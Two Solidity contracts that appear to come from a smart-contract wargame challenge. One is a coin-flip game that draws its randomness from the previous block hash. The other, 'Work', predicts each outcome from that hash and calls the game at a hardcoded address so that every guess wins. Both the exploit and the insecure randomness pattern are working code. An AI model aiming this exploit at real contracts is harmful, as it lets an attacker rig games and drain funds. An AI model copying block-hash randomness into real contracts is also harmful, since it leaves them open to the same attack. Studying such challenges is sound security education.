pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Work {
  
  address target = address(0x392cB5DE9f5096dFE630442c6ae099463d6217fB);

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

//   function flip() public view returns (uint256, uint256, bytes32) {
//     bytes32 bh = blockhash(block.number - 1);
//     uint256 blockValue = uint256(blockhash(block.number - 1));

//     uint256 coinFlip = blockValue / FACTOR;

//     return (coinFlip, blockValue, bh);
//   }

  function bhu(uint256 bn) public view returns(uint256) {
      return uint256(blockhash(bn - 1));
  }

  function bh(uint256 bn) public view returns(bytes32) {
      return blockhash(bn-1);
  }

  function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(target).flip(side);
    }
}